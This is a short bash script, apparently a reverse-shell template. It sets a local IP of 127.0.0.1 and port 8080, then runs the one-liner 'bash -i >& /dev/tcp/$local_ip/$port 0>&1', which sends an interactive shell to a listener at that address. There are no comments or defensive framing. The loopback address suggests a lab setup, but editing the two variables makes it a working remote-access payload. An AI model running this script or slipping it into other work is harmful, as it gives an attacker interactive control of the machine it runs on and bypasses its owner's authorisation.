#!/bin/bash
local_ip=127.0.0.1
port=8080
bash -i >& /dev/tcp/$local_ip/$port 0>&1


